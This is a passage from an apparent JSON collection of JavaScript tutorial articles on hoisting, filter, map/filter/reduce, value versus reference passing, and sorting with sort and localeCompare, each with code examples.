let/const hoisted to block, not function\n```\n\n## Common Gotchas\n\n### 1. var in Loops\n\n```javascript\n// ❌ Common mistake with var\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// Output: 3, 3, 3 (all closures reference same i)\n\n// ✅ Fix with let (block scoped)\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// Output: 0, 1, 2 (each iteration has its own i)\n```\n\n### 2. Function vs Variable Name Collision\n\n```javascript\n// Functions hoist above variables\nconsole.log(typeof foo);  // \"function\"\n\nvar foo = 'variable';\nfunction foo() {\n  return 'function';\n}\n\nconsole.log(typeof foo);  // \"string\"\n\n// Interpreted as:\nfunction foo() { return 'function'; }  // Function hoisted first\nvar foo;                               // Variable declaration (ignored - already declared)\nconsole.log(typeof foo);               // \"function\"\nfoo = 'variable';                      // Assignment\nconsole.log(typeof foo);               // \"string\"\n```\n\n### 3. Temporal Dead Zone Edge Cases\n\n```javascript\n// ❌ TDZ applies even in weird cases\nlet x = x + 1;  // ReferenceError: x is not defined\n// x is in TDZ when trying to read it for assignment\n\n// ✅ Works with var (undefined + 1 = NaN)\nvar y = y + 1;\nconsole.log(y);  // NaN (undefined + 1)\n\n// TDZ in default parameters\nfunction test(a = b, b = 2) {  // ❌ ReferenceError\n  return a + b;\n}\n// b is in TDZ when evaluating default for a\n\nfunction test(a = 1, b = a) {  // ✅ Works\n  return a + b;\n}\n```\n\n### 4. Class Hoisting\n\n```javascript\n// Classes are hoisted but in TDZ\nconst instance = new MyClass();  // ❌ ReferenceError\n\nclass MyClass {\n  constructor() {}\n}\n\n// Must declare before use\nclass MyClass {\n  constructor() {}\n}\nconst instance = new MyClass();  // ✅ Works\n```\n\n## Best Practices\n\n```javascript\n// ✅ Declare variables at top of scope\nfunction good() {\n  let x, y, z;  // Clear what's in scope\n  \n  x = 1;\n  y = 2;\n  z = x + y;\n}\n\n// ❌ Rely on hoisting\nfunction bad() {\n  console.log(x);  // Confusing\n  var x = 1;\n}\n\n// ✅ Use let/const instead of var\nlet count = 0;\nconst MAX = 100;\n\n// ❌ Use var (function scoped, hoisting confusion)\nvar count = 0;\n\n// ✅ Declare functions before use (even though they hoist)\nfunction calculate() {\n  return add(1, 2);\n}\n\nfunction add(a, b) {\n  return a + b;\n}\n\n// ❌ Depend on function hoisting\ndoSomething();  // Confusing to readers\n\nfunction doSomething() {}\n```\n\n## Hoisting Summary Table\n\n| Type | Hoisted? | Initialized? | TDZ? | Scope |\n|------|----------|--------------|------|-------|\n| `var` | ✅ Yes | ✅ `undefined` | ❌ No | Function |\n| `let` | ✅ Yes | ❌ No | ✅ Yes | Block |\n| `const` | ✅ Yes | ❌ No | ✅ Yes | Block |\n| Function Declaration | ✅ Yes | ✅ Full definition | ❌ No | Function |\n| Function Expression | Depends on `var`/`let`/`const` | ❌ No | Depends | Depends |\n| Class | ✅ Yes | ❌ No | ✅ Yes | Block |\n\n## Quick Rules\n\n```javascript\n// var - avoid\nvar x = 1;  // Hoisted, initialized to undefined, function scoped\n\n// let - use for variables that change\nlet y = 2;  // Hoisted, TDZ, block scoped\n\n// const - use by default\nconst z = 3;  // Hoisted, TDZ, block scoped, immutable binding\n\n// Function declarations - fully hoisted\nfunction foo() {}  // Can call before declaration (but don't)\n\n// Function expressions/arrows - not fully hoisted\nconst bar = () => {};  // Must declare before use\n```\n\n## References\n\n- [MDN: Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)\n- [ES6 Temporal Dead Zone](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#temporal_dead_zone_tdz)\n- [You Don't Know JS](https://github.com/getify/You-Dont-Know-JS)\n\n---\n\n## Summary\n\n**Hoisting:** Declarations move to top of scope during compilation.\n\n**var:** Hoisted + initialized to `undefined` → can use before declaration (confusing!)\n\n**let/const:** Hoisted but TDZ → can't use before declaration (safer)\n\n**Functions:** Fully hoisted → work before declaration (but declare first anyway)\n\n**Rule of thumb:** Use `const` by default, `let` when needed, avoid `var`. Don't rely on hoisting—declare before use."
    },
    {
      "id": "swe/languages/javascript/map-filter-reduce/filter-method-js-overview",
      "title": "JavaScript Array.filter(): A Well-Structured Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "map-filter-reduce",
        "filter-method-js-overview"
      ],
      "content": "# JavaScript Array.filter(): A Well-Structured Overview\n\nThe `filter()` method in JavaScript creates a new array with all elements that pass the test implemented by the provided callback function. It is a powerful tool for selecting data based on conditions.\n\n## Key Points\n\n- **Purpose:** Returns a new array containing only elements that satisfy the callback condition.\n- **Signature:** `array.filter(callback(currentValue, index, array), thisArg?)`\n- **Non-Mutating:** Does not change the original array.\n- **Callback Arguments:** Receives `currentValue`, `index`, and `array`; use only what you need.\n- **Chaining:** Often used with other array methods like `map` and `reduce`.\n- **thisArg:** Optional parameter to set the value of `this` inside the callback.\n- **Performance:** Efficient for filtering, but avoid unnecessary complexity in the callback.\n\n## Step-by-Step Explanation & Examples\n\n1. **Filtering Even Numbers**\n   ```js\n   const numbers = [1, 2, 3, 4, 5, 6];\n   const evens = numbers.filter(n => n % 2 === 0);\n   // [2, 4, 6]\n   ```\n\n2. **Filtering Strings by Length**\n   ```js\n   const words = ['hello', 'world', 'javascript', 'cat'];\n   const longWords = words.filter(word => word.length > 5);\n   // ['javascript']\n   ```\n\n3. **Filtering Objects by Property**\n   ```js\n   const users = [\n     { name: 'Alice', active: true },\n     { name: 'Bob', active: false },\n     { name: 'Carol', active: true }\n   ];\n   const activeUsers = users.filter(user => user.active);\n   // [{ name: 'Alice', ... }, { name: 'Carol', ... }]\n   ```\n\n4. **Using Index in the Callback**\n   ```js\n   const evenIndex = numbers.filter((_, idx) => idx % 2 === 0);\n   // [1, 3, 5]\n   ```\n\n5. **Using thisArg**\n   ```js\n   const threshold = { min: 4 };\n   const aboveThreshold = numbers.filter(function(n) {\n     return n >= this.min;\n   }, threshold);\n   // [4, 5, 6]\n   ```\n\n## Common Pitfalls\n\n- Forgetting to return a boolean from the callback.\n- Expecting the original array to be mutated.\n- Using complex logic in the callback, which can hurt readability and performance.\n- Not handling edge cases (e.g., empty arrays).\n\n## Practical Applications\n\n- Filtering search results or user input.\n- Selecting items based on status or properties.\n- Cleaning data before processing or display.\n- Implementing custom selection logic in UI components.\n\n## References\n\n- [MDN: Array.prototype.filter()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter)\n- [JavaScript.info: Array methods](https://javascript.info/array-methods#filter)\n- [Eloquent JavaScript: Higher-Order Functions](https://eloquentjavascript.net/05_higher_order.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Composability:** Combine `filter` with `map` and `reduce` for complex data transformations.\n- **Performance Optimization:** Use memoization or early returns for expensive filtering.\n- **TypeScript Usage:** Use type guards in the callback for type-safe filtering.\n- **Functional Programming:** `filter` is a key tool in functional"
    },
    {
      "id": "swe/languages/javascript/map-filter-reduce/map-filter-reduce-intro",
      "title": "JavaScript `map`, `filter`, and `reduce`: A Practical Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "map-filter-reduce",
        "map-filter-reduce-intro"
      ],
      "content": "# JavaScript `map`, `filter`, and `reduce`: A Practical Overview\n\nJavaScript’s `map`, `filter`, and `reduce` are powerful ARRAY methods for transforming, selecting, and aggregating data. Mastering them leads to cleaner, more expressive code.\n\n## Key Points\n\n- **`map`** transforms each element in an array and returns a new array.\n- **`filter`** selects elements based on a condition and returns a new array.\n- **`reduce`** accumulates array values into a single result (e.g., sum, object).\n\n- All three methods are non-mutating—they do not change the original array.\n- They are often chained for complex data processing.\n\n## Step-by-Step Explanation & Examples\n\n### 1. `map`\nTransforms each element.\n```js\nconst nums = [1, 2, 3];\nconst squares = nums.map(n => n * n); // [1, 4, 9]\n```\n\n### 2. `filter`\nSelects elements that match a condition.\n```js\nconst nums = [1, 2, 3, 4];\nconst evens = nums.filter(n => n % 2 === 0); // [2, 4]\n```\n\n### 3. `reduce`\nReduces the array to a single value.\n```js\nconst nums = [1, 2, 3, 4];\nconst sum = nums.reduce((acc, n) => acc + n, 0); // 10\n```\n\n## Common Pitfalls\n\n- Forgetting to return a value in the callback (especially with `map` and `filter`).\n- Using `reduce` without an initial value can cause errors with empty arrays.\n- Expecting these methods to mutate the original array—they do not.\n\n## Practical Applications\n\n- Data transformation (e.g., formatting API results).\n- Filtering lists (e.g., search, permissions).\n- Aggregating data (e.g., totals, grouping).\n\n## References\n\n- [MDN: Array.prototype.map()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map)\n- [MDN: Array.prototype.filter()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter)\n- [MDN: Array.prototype.reduce()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce)"
    },
    {
      "id": "swe/languages/javascript/pass-by-value-reference-js",
      "title": "Passing by Value vs Passing by Reference in JavaScript: A Well-Structured Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "pass-by-value-reference-js"
      ],
      "content": "# Passing by Value vs Passing by Reference in JavaScript: A Well-Structured Overview\n\nJavaScript uses pass-by-value for primitives (copying the value) and pass-by-reference for objects (copying the reference pointer), affecting how function arguments behave when modified inside functions.\n\n## Key Points\n\n- **Definition:** Pass-by-value creates a copy of the data, while pass-by-reference passes a pointer to the original data's memory location.\n- **Primitives (Pass-by-Value):** Numbers, strings, booleans, `null`, `undefined`, symbols, and BigInts are copied when passed to functions.\n- **Objects (Pass-by-Reference):** Objects, arrays, functions, dates, and other non-primitives pass references to the original data.\n- **Immutability:** Reassigning a parameter breaks the reference, but mutating object properties affects the original.\n- **Memory Efficiency:** References avoid copying large data structures, but create potential for unintended side effects.\n- **Common Confusion:** JavaScript is technically always pass-by-value, but for objects it passes the reference value itself.\n- **Best Practice:** Treat function parameters as immutable—avoid modifying objects passed as arguments to prevent bugs.\n\n## Step-by-Step Explanation & Examples\n\n**Pass-by-Value (Primitives)**\n```javascript\n// Primitives: number, string, boolean, null, undefined, symbol, BigInt\n\nfunction modifyPrimitive(num) {\n  num = num + 10;        // Creates new value, doesn't affect original\n  console.log(\"Inside:\", num);\n}\n\nlet x = 5;\nmodifyPrimitive(x);      // Inside: 15\nconsole.log(\"Outside:\", x); // Outside: 5 (unchanged)\n\n// Explanation:\n// 1. x holds value 5\n// 2. Function receives COPY of 5 in parameter 'num'\n// 3. num = num + 10 creates new value 15, stored in 'num'\n// 4. Original x remains 5 (no connection to 'num')\n\n// Same behavior with strings\nfunction modifyString(str) {\n  str = str + \" World\";  // Creates new string, doesn't affect original\n  return str;\n}\n\nlet greeting = \"Hello\";\nmodifyString(greeting);    // Returns \"Hello World\"\nconsole.log(greeting);     // \"Hello\" (unchanged)\n```\n\n**Pass-by-Reference (Objects)**\n```javascript\n// Objects: objects, arrays, functions, dates, etc.\n\nfunction modifyObject(obj) {\n  obj.name = \"Bob\";      // Modifies ORIGINAL object via reference\n  obj.age = 30;\n  console.log(\"Inside:\", obj);\n}\n\nlet user = { name: \"Alice\", age: 25 };\nmodifyObject(user);       // Inside: { name: \"Bob\", age: 30 }\nconsole.log(\"Outside:\", user); // Outside: { name: \"Bob\", age: 30 } (CHANGED!)\n\n// Explanation:\n// 1. user points to object in memory at address 0x001\n// 2. Function receives COPY of reference (also points to 0x001)\n// 3. obj.name modifies object at 0x001\n// 4. Original user still points to 0x001, sees modifications\n\n// Reassignment breaks the reference\nfunction reassignObject(obj) {\n  obj = { name: \"Charlie\", age: 35 };  // Creates NEW object, breaks reference\n  console.log(\"Inside:\", obj);\n}\n\nlet person = { name: \"Alice\", age: 25 };\nreassignObject(person);    // Inside: { name: \"Charlie\", age: 35 }\nconsole.log(\"Outside:\", person); // Outside: { name: \"Alice\", age: 25 } (unchanged)\n\n// Explanation:\n// 1. person points to 0x001\n// 2. Function receives copy of reference (points to 0x001)\n// 3. obj = {...} creates NEW object at 0x002, reassigns 'obj' to point there\n// 4. Original 'person' still points to 0x001, unaffected\n\n// Arrays behave identically\nfunction modifyArray(arr) {\n  arr.push(4);           // Modifies original array\n  arr[0] = 99;           // Modifies original array\n  console.log(\"Inside:\", arr);\n}\n\nlet numbers = [1, 2, 3];\nmodifyArray(numbers);     // Inside: [99, 2, 3, 4]\nconsole.log(\"Outside:\", numbers); // Outside: [99, 2, 3, 4] (CHANGED!)\n\nfunction reassignArray(arr) {\n  arr = [7, 8, 9];       // Creates new array, breaks reference\n  console.log(\"Inside:\", arr);\n}\n\nlet nums = [1, 2, 3];\nreassignArray(nums);      // Inside: [7, 8, 9]\nconsole.log(\"Outside:\", nums); // Outside: [1, 2, 3] (unchanged)\n```\n\n**Avoiding Unintended Mutations**\n```javascript\n// Problem: Function mutates original object\nfunction updateUser(user) {\n  user.lastLogin = new Date();\n  user.loginCount++;\n  return user;  // Returns same object reference\n}\n\nconst currentUser = { name: \"Alice\", loginCount: 5 };\nconst updated = updateUser(currentUser);\nconsole.log(currentUser === updated);  // true (same object!)\nconsole.log(currentUser.loginCount);   // 6 (mutated!)\n\n// Solution 1: Spread operator (shallow copy)\nfunction updateUserSafe(user) {\n  return {\n    ...user,                    // Copy all properties\n    lastLogin: new Date(),      // Add/override properties\n    loginCount: user.loginCount + 1\n  };\n}\n\nconst safeUpdated = updateUserSafe(currentUser);\nconsole.log(currentUser === safeUpdated);    // false (different objects)\nconsole.log(currentUser.loginCount);         // 6 (unchanged from before)\nconsole.log(safeUpdated.loginCount);         // 7 (new object modified)\n\n// Solution 2: Object.assign (shallow copy)\nfunction updateUserAssign(user) {\n  const copy = Object.assign({}, user);\n  copy.lastLogin = new Date();\n  copy.loginCount++;\n  return copy;\n}\n\n// Solution 3: Deep copy for nested objects\nfunction deepCopy(obj) {\n  return JSON.parse(JSON.stringify(obj));  // Simple but has limitations\n  // OR use structuredClone(obj) in modern browsers\n}\n\nconst nested = { user: { name: \"Bob\", settings: { theme: \"dark\" } } };\nconst deepCopied = structuredClone(nested);\ndeepCopied.user.settings.theme = \"light\";\nconsole.log(nested.user.settings.theme);     // \"dark\" (unchanged)\nconsole.log(deepCopied.user.settings.theme); // \"light\" (independent copy)\n```\n\n## Common Pitfalls\n\n- Assuming primitives behave like objects—modifying primitive parameters never affects the original.\n- Mutating object parameters unintentionally—side effects cause bugs in other parts of code.\n- Confusing reassignment with mutation—`obj = newObj` doesn't affect original, `obj.prop = value` does.\n- Using shallow copies for nested objects—spread operator only copies first level, nested objects still share references.\n- Forgetting arrays are objects—they behave like objects, not primitives.\n- Relying on `JSON.parse(JSON.stringify())` for deep cloning—loses functions, dates, and special objects.\n- Not documenting whether functions mutate arguments—leads to confusion about expected behavior.\n\n## Practical Applications\n\n- **Pure Functions:** Return new objects instead of mutating parameters for predictable, testable code.\n- **State Management:** React/Redux require immutability—always create new state objects rather than mutating.\n- **API Data Transformation:** Clone API responses before modifying to avoid affecting cached data.\n- **Array Operations:** Use `.map()`, `.filter()`, `.slice()` instead of `.push()`, `.splice()` to avoid mutations.\n\n**Example anecdote:** On a user profile page, I wrote a function to format user data for display. It modified the `user` object directly by adding formatted fields. Worked fine until another component tried displaying the same user—it showed the formatted data where it needed raw data. The bug was hard to trace because the mutation happened silently in a distant function. After switching to returning a new object with `{ ...user, formattedName: ... }`, both components worked correctly with independent data copies.\n\n## References\n\n- [MDN: Primitive Values](https://developer.mozilla.org/en-US/docs/Glossary/Primitive)\n- [MDN: Object References](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)\n- [JavaScript.info: Object Copying](https://javascript.info/object-copy)\n- [MDN: structuredClone()](https://developer.mozilla.org/en-US/docs/Web/API/structuredClone)\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Technical Accuracy:** JavaScript is always pass-by-value, but for objects it passes the reference value (pointer) by value—hence \"pass-by-sharing.\"\n- **Shallow vs Deep Copy:**\n  - Shallow: Copies first level only. Spread `{...obj}`, `Object.assign()`, `[...arr]`\n  - Deep: Recursively copies all nested levels. `structuredClone()`, `JSON.parse(JSON.stringify())`, Lodash `_.cloneDeep()`\n- **structuredClone() Limitations:** Doesn't copy functions, DOM nodes, or getters/setters, but handles dates, maps, sets, typed arrays.\n- **Immutable Data Patterns:** Libraries like Immer, Immutable.js provide efficient immutable operations for complex state.\n- **Spread Operator Gotcha:** `{...obj}` creates shallow copy—nested objects still reference originals.\n  ```javascript\n  const original = { a: 1, nested: { b: 2 } };\n  const copy = { ...original };\n  copy.nested.b = 99;\n  console.log(original.nested.b);  // 99 (nested object shared!)\n  ```\n- **Array Methods (Mutating vs Non-Mutating):**\n  - Mutating: `push()`, `pop()`, `shift()`, `unshift()`, `splice()`, `sort()`, `reverse()`\n  - Non-mutating: `map()`, `filter()`, `slice()`, `concat()`, `reduce()`, `toSorted()`, `toReversed()`\n- **Const with Objects:** `const` prevents reassignment but allows mutation.\n  ```javascript\n  const obj = { x: 1 };\n  obj = { x: 2 };      // Error: Assignment to constant\n  obj.x = 2;           // Works: Mutation allowed\n  ```\n- **Object.freeze():** Prevents modifications to object properties (shallow freeze).\n  ```javascript\n  const frozen = Object.freeze({ a: 1, nested: { b: 2 } });\n  frozen.a = 99;       // Silently fails (throws in strict mode)\n  frozen.nested.b = 99; // Works (nested objects not frozen!)\n  ```\n- **Object.seal():** Prevents adding/removing properties but allows modifying existing ones.\n- **Performance Considerations:** Cloning large objects is expensive—use references when possible, clone only when necessary.\n- **WeakMap/WeakSet:** Hold weak references that don't prevent garbage collection—useful for metadata without memory leaks.\n- **Proxy Objects:** Intercept and customize operations like property access, useful for immutability enforcement.\n- **Copy-on-Write (COW):** Optimization where references are shared until modification, then copy is made (used in Immer).\n- **Reference Equality:** `obj1 === obj2` checks if they reference the same object, not if contents are equal.\n  ```javascript\n  { a: 1 } === { a: 1 }  // false (different references)\n  const x = { a: 1 };\n  const y = x;\n  x === y                // true (same reference)\n  ```\n- **Deep Equality:** Use libraries like Lodash `_.isEqual()` or custom recursive comparison for value-based equality.\n- **Memory Management:** Unused references prevent garbage collection—set large objects to `null` when done.\n- **Function Arguments Object:** `arguments` is array-like object containing all passed arguments (not true array).\n- **Rest Parameters:** `...args` creates actual array, more modern than `arguments` object."
    },
    {
      "id": "swe/languages/javascript/sort/localcompare-js-sort",
      "title": "JavaScript Sorting with localeCompare",
      "path": [
        "swe",
        "languages",
        "javascript",
        "sort",
        "localcompare-js-sort"
      ],
      "content": "# JavaScript Sorting with localeCompare\n\n`localeCompare()` is a string method that compares two strings according to locale-specific rules, making it essential for proper internationalized sorting. Unlike simple comparison operators, it handles accents, case sensitivity, and language-specific ordering correctly.\n\n## Key Points\n\n- **Locale-Aware:** Respects language-specific sorting rules (e.g., Swedish å comes after z)\n- **Unicode Handling:** Properly sorts accented characters (é, ñ, ü) according to cultural norms\n- **Return Values:** Returns -1, 0, or 1 (negative if first string comes before, positive if after)\n- **Options Object:** Control case sensitivity, numeric ordering, and punctuation handling\n- **Performance:** Slightly slower than basic comparison but necessary for correct sorting\n- **Browser Support:** Widely supported with consistent behavior across modern browsers\n\n## Step-by-Step Explanation & Examples\n\n### 1. Basic String Sorting\n\nWithout `localeCompare`, sorting fails with special characters:\n\n```js\nconst names = ['Zoë', 'Alice', 'Émile', 'Bob'];\n\n// Wrong way - produces unexpected order\nnames.sort((a, b) => a > b ? 1 : -1);\n// Result: ['Alice', 'Bob', 'Zoë', 'Émile'] (incorrect)\n\n// Correct way\nnames.sort((a, b) => a.localeCompare(b));\n// Result: ['Alice', 'Bob', 'Émile', 'Zoë']\n```\n\n### 2. Case-Insensitive Sorting\n\nReal-world scenario: Sorting user-submitted data where capitalization varies.\n\n```js\nconst products = ['iPhone', 'iPad', 'IMAC', 'AirPods'];\n\n// Case-insensitive sort\nproducts.sort((a, b) => \n  a.localeCompare(b, undefined, { sensitivity: 'base' })\n);\n// Result: ['AirPods', 'IMAC', 'iPad', 'iPhone']\n```\n\n### 3. Numeric String Sorting\n\nAnecdote: I once had a bug where file names like \"file1.txt\", \"file10.txt\", \"file2.txt\" sorted incorrectly. The `numeric` option saved hours of custom parsing logic.\n\n```js\nconst files = ['file10.txt', 'file2.txt', 'file1.txt', 'file20.txt'];\n\n// Without numeric option - lexicographic sort\nfiles.sort((a, b) => a.localeCompare(b));\n// Result: ['file1.txt', 'file10.txt', 'file2.txt', 'file20.txt'] (wrong)\n\n// With numeric option - natural sort\nfiles.sort((a, b) => \n  a.localeCompare(b, undefined, { numeric: true })\n);\n// Result: ['file1.txt', 'file2.txt', 'file10.txt', 'file20.txt'] (correct)\n```\n\n### 4. Locale-Specific Sorting\n\nDifferent languages have different sorting rules:\n\n```js\nconst words = ['ä', 'z', 'a'];\n\n// German sorting (ä treated like a)\nwords.sort((a, b) => a.localeCompare(b, 'de'));\n// Result: ['a', 'ä', 'z']\n\n// Swedish sorting (ä comes after z)\nwords.sort((a, b) => a.localeCompare(b, 'sv'));\n// Result: ['a', 'z', 'ä']\n```\n\n### 5. Sorting Objects by Property\n\n```js\nconst users = [\n  { name: 'Zoë', age: 25 },\n  { name: 'Alice', age: 30 },\n  { name: 'Émile', age: 28 }\n];\n\nusers.sort((a, b) => a.name.localeCompare(b.name));\n// Sorted by name: Alice, Émile, Zoë\n```\n\n### 6. Advanced Options Configuration\n\n```js\nconst items = ['Resume.pdf', 'resume.PDF', 'RESUME.txt'];\n\nitems.sort((a, b) => a.localeCompare(b, 'en', {\n  sensitivity: 'base',      // Ignore case and accents\n  numeric: true,            // Natural number ordering\n  ignorePunctuation: true   // Ignore punctuation marks\n}));\n```\n\n### 7. Performance Optimization for Large Arrays\n\nCreate a collator for repeated comparisons:\n\n```js\nconst collator = new Intl.Collator('en', {\n  numeric: true,\n  sensitivity: 'base'\n});\n\nconst largeArray = [...]; // thousands of items\nlargeArray.sort((a, b) => collator.compare(a, b));\n// Faster than calling localeCompare repeatedly\n```\n\n## Common Pitfalls\n\n- **Forgetting locale parameter**: Without specifying locale, behavior depends on browser/system settings\n- **Not handling null/undefined**: Call `localeCompare` on strings that might be null\n- **Performance on large datasets**: Consider using `Intl.Collator` for arrays with 1000+ items\n- **Mixing data types**: Ensure you're comparing strings; numbers need `.toString()` first\n- **Assuming ASCII ordering**: Don't rely on character codes for non-English text\n\n## Practical Applications\n\n- **User Interface Lists:** Alphabetically sorting names, cities, or product names\n- **File Management Systems:** Natural sorting of filenames with version numbers\n- **Multi-Language Apps:** Respecting cultural sorting conventions per user locale\n- **Search Results:** Ordering results alphabetically in user's language\n- **Data Tables:** Client-side sorting of table columns with mixed content\n- **Autocomplete Dropdowns:** Organizing suggestions in expected order\n\n## References\n\n- [MDN: String.prototype.localeCompare()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/localeCompare)\n- [MDN: Intl.Collator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/Collator)\n- [ECMAScript Internationalization API](https://tc39.es/ecma402/)\n\n---\n\n## Greater Detail: Advanced Concepts\n\n### Custom Collation Rules\n\nFine-tune sorting behavior with all available options:\n\n```js\nconst collator = new Intl.Collator('en', {\n  usage: 'sort',              // 'sort' or 'search'\n  sensitivity: 'variant',     // 'base', 'accent', 'case', 'variant'\n  numeric: true,              // Numeric ordering\n  ignorePunctuation: false,   // Consider punctuation\n  caseFirst: 'upper'          // 'upper', 'lower', or 'false'\n});\n\nconst items = ['10-A', '2-B', '2-a', '10-a'];\nitems.sort(collator.compare);\n// Applies all rules consistently\n```\n\n### Sensitivity Options Explained\n\n```js\nconst str1 = 'résumé';\nconst str2 = 'resume';\nconst str3 = 'RESUME';\n\n// 'base': Ignore case and accents\nconsole.log(str1.localeCompare(str2, 'en', { sensitivity: 'base' }));\n// 0 (equal)\n\n// 'accent': Consider accents, ignore case\nconsole.log(str1.localeCompare(str2, 'en', { sensitivity: 'accent' }));\n// 1 (different)\n\n// 'case': Consider case, ignore accents\nconsole.log(str2.localeCompare(str3, 'en', { sensitivity: 'case' }));\n// 1 (different)\n\n// 'variant': Consider both\nconsole.log(str1.localeCompare(str3, 'en', { sensitivity: 'variant' }));\n// 1 (different)\n```\n\n### Multi-Field Sorting\n\nSorting by multiple criteria with fallback:\n\n```js\nconst employees = [\n  { department: 'Engineering', name: 'Zoë', salary: 90000 },\n  { department: 'Engineering', name: 'Alice', salary: 95000 },\n  { department: 'Sales', name: 'Bob', salary: 85000 },\n  { department: 'Engineering', name: 'Émile', salary: 90000 }\n];\n\nemployees.sort((a, b) => {\n  // First by department\n  let comparison = a.department.localeCompare(b.department);\n  if (comparison !== 0) return comparison;\n  \n  // Then by salary (descending)\n  comparison = b.salary - a.salary;\n  if (comparison !== 0) return comparison;\n  \n  // Finally by name\n  return a.name.localeCompare(b.name);\n});\n```\n\n### Handling Mixed Content\n\nSorting strings that may contain numbers, symbols, and text:\n\n```js\nconst versions = ['v1.2.10', 'v1.10.1', 'v1.2.2', 'v2.0.0'];\n\nversions.sort((a, b) => a.localeCompare(b, undefined, {\n  numeric: true,\n  sensitivity: 'base'\n}));\n// Result: ['v1.2.2', 'v1.2.10', 'v1.10.1', 'v2.0.0']\n```\n\n### Performance Benchmarking\n\nWhen to use `Intl.Collator` vs `localeCompare`:\n\n```js\nconst data = Array.from({ length: 10000 }, (_, i) => `item${i}`);\n\n// Slower: Creates new collator each comparison\nconsole.time('localeCompare');\ndata.sort((a, b) => a.localeCompare(b, 'en', { numeric: true }));\nconsole.timeEnd('localeCompare');\n\n// Faster: Reuses collator instance\nconsole.time('Intl.Collator');\nconst collator = new Intl.Collator('en', { numeric: true });\ndata.sort(collator.compare);\nconsole.timeEnd('Intl.Collator');\n// Typically 2-3x faster for large arrays\n```\n\n### Custom Sort with Diacritics Normalization\n\nHandle edge cases with Unicode normalization:\n\n```js\nconst strings = ['café', 'cafe\\u0301']; // Second has combining accent\n\n// These look identical but aren't equal\nconsole.log(strings[0] === strings[1]); // false\n\n// Normalize before comparing\nconst normalized = strings.map(s => s.normalize('NFD'));\nnormalized.sort((a, b) => a.localeCompare(b));\n```\n\n### Locale Detection and Fallback\n\nAdapt to user's locale dynamically:\n\n```js\nfunction sortByUserLocale(array) {\n  const userLocale = navigator.language || 'en-US';\n  \n  return array.sort((a, b) => \n    a.localeCompare(b, userLocale, {\n      numeric: true,\n      sensitivity: 'base'\n    })\n  );\n}\n\n// Automatically uses user's browser language settings\nconst sorted = sortByUserLocale(['Zoë', '10th', 'Émile', '2nd']);\n```\n\n### Handling Null and Undefined Values\n\nRobust sorting function:\n\n```js\nfunction safeSortStrings(array, options = {}) {\n  return array.sort((a, b) => {\n    // Handle null/undefined - put at end\n    if (a == null) return 1;\n    if (b == null) return -1;\n    \n    // Convert to string and compare\n    return String(a).localeCompare(String(b), undefined, options);\n  });\n}\n\nconst mixed = ['banana', null, 'apple', undefined, 'cherry'];\nsafeSortStrings(mixed);\n// Result: ['apple', 'banana', 'cherry', null, undefined]\n```"
    },
    {
      "id": "swe/languages/javascript/sort/sort-js-method",
      "title": "JavaScript Array.sort(): Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "sort",
        "sort-js-method"
      ],
      "content": "# JavaScript Array.sort(): Complete Overview\n\nThe `Array.prototype.sort()` method in JavaScript is used to arrange the elements of an array in place, either alphabetically or numerically, based on a comparison function. It is a powerful tool for organizing data, but requires careful use to avoid common pitfalls. Most modern JavaScript engines (like V8 in Chrome and Node.js) use **Timsort**, a hybrid algorithm derived from merge sort and insertion sort, for efficient and stable sorting. Some older engines may use QuickSort or MergeSort.\n\n## Key Points\n\n- **Default Behavior:** Sorts elements as strings in ascending order.\n- **Custom Compare Function:** Enables sorting numbers, objects, or custom criteria.\n- **In-Place Sorting:** Modifies the original array, does not return a new one.\n- **Algorithm:** Most JS engines use Timsort for performance and stability.\n- **Stability:** Modern JS sorts are stable (equal elements retain order).\n\n## Step-by-Step Explanation & Examples\n\n1. **Default Sort (Strings)**\n\n   ```js\n   const fruits = [\"banana\", \"apple\", \"cherry\"];\n   fruits.sort();\n   // ['apple', 'banana', 'cherry']\n   ```\n\n2. **Sorting Numbers**\n\n   ```js\n   const numbers = [42, 7, 19, 3, 25, 8, 15, 33, 2, 10];\n   numbers.sort(); // [10, 19, 2, 25, 3, 33, 42, 7, 8, 15] (incorrect for numbers)\n   numbers.sort((a, b) => a - b); // [2, 3, 7, 8, 10, 15, 19, 25, 33, 42]\n   ```\n\n3. **Sorting Objects**\n\n   ```js\n   const users = [\n     { name: \"Bob\", age: 30 },\n     { name: \"Alice\", age: 25 },\n     { name: \"Carol\", age: 28 },\n   ];\n   users.sort((a, b) => a.age - b.age);\n   // [{name: 'Alice', age: 25}, {name: 'Carol', age: 28}, {name: 'Bob', age: 30}]\n   ```\n\n4. **Divide and Conquer Comparison (QuickSort Example)**\n\n   - The array is divided into smaller subarrays.\n   - Each subarray is sorted recursively.\n   - Elements are compared and swapped based on the compare function.\n   - Subarrays are merged to produce the final sorted array.\n\n   ```js\n   // Pseudocode for divide and conquer sorting\n   function quickSort(arr) {\n     if (arr.length <= 1) return arr;\n     const pivot = arr[0];\n     const left = arr.slice(1).filter((x) => x < pivot);\n     const right = arr.slice(1).filter((x) => x >= pivot);\n     return [...quickSort(left), pivot, ...quickSort(right)];\n   }\n   ```\n\n5. **Locale-Aware Sorting**\n   ```js\n   const names = [\"Émile\", \"Ana\", \"Zoë\"];\n   names.sort((a, b) => a.localeCompare(b));\n   // ['Ana', 'Émile', 'Zoë']\n   ```\n\n## Common Pitfalls\n\n- Forgetting to provide a compare function for numbers or objects.\n- Assuming `sort()` returns a new array (it mutates the original).\n- Unexpected results with mixed types or 